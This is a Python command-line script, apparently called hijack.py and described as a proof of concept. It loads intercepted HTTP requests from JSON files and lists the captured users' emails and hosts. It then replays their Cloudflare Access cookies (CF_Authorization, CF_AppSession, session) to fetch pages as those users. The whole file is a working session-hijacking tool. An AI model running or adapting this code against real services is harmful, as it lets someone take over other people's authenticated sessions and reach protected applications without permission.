import os
import json
import requests
import sys
from tabulate import tabulate

LOGS_FOLDER_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'intercepted_requests')

# Function to load all requests from files in the folder
def load_requests_from_files():
    requests_list = []
    for filename in os.listdir(LOGS_FOLDER_PATH):
        if filename.endswith(".json"):
            file_path = os.path.join(LOGS_FOLDER_PATH, filename)
            with open(file_path, 'r') as f:
                try:
                    data = json.load(f)
                    requests_list.append(data)
                except json.JSONDecodeError:
                    print(f"Error decoding JSON in file {filename}")
    return requests_list

# List all available sessions
def list_sessions():
    requests_list = load_requests_from_files()
    sessions = []
    
    for i, request_data in enumerate(requests_list):
        timestamp = request_data.get("timestamp", "N/A")
        email = request_data.get("headers", {}).get("Cf-Access-Authenticated-User-Email", "N/A")
        host = request_data.get("headers", {}).get("Host", "N/A")
        sessions.append([i + 1, timestamp, email, host])

    # Display the sessions in a table
    headers = ["Session Number", "Timestamp", "Email", "Host"]
    print(tabulate(sessions, headers=headers, tablefmt="grid"))

# Run a PoC using cookies from the selected session
def run_poc(session_number):
    requests_list = load_requests_from_files()

    # Ensure valid session number
    if session_number < 1 or session_number > len(requests_list):
        print("Invalid session number.")
        return

    # Get the selected session data
    request_data = requests_list[session_number - 1]

    # Extract the cookies
    cookies = {
        "CF_AppSession": request_data.get("headers", {}).get("Cookie", "").split("CF_AppSession=")[-1].split(";")[0],
        "CF_Authorization": request_data.get("headers", {}).get("Cookie", "").split("CF_Authorization=")[-1].split(";")[0],
        "redirect_token": request_data.get("headers", {}).get("Cookie", "").split("redirect_token=")[-1].split(";")[0],
        "session": request_data.get("headers", {}).get("Cookie", "").split("session=")[-1].split(";")[0]
    }

    # Check if Referer exists, otherwise use Host
    referer = request_data.get("headers", {}).get("Referer", "")
    if referer:
        url = referer
    else:
        host = request_data.get("headers", {}).get("Host", "localhost")
        url = f"https://{host}"

    # Send GET request using the cookies
    response = requests.get(url, cookies=cookies, allow_redirects=True)

    # Print final response
    print("Final Status Code:", response.status_code)
    print("Final Headers:", response.headers)
    print("Final Content:", response.text)

# Main function to handle commands
def main():
    # Check for command-line arguments
    if len(sys.argv) < 2:
        print("Usage: python3 hijack.py <command> [args]")
        sys.exit(1)

    command = sys.argv[1]

    if command == "list":
        list_sessions()
    elif command == "poc" and len(sys.argv) == 3:
        try:
            session_number = int(sys.argv[2])
            run_poc(session_number)
        except ValueError:
            print("Invalid session number.")
            sys.exit(1)
    else:
        print("Usage: python3 hijack.py <command> [args]")
        sys.exit(1)

if __name__ == "__main__":
    main()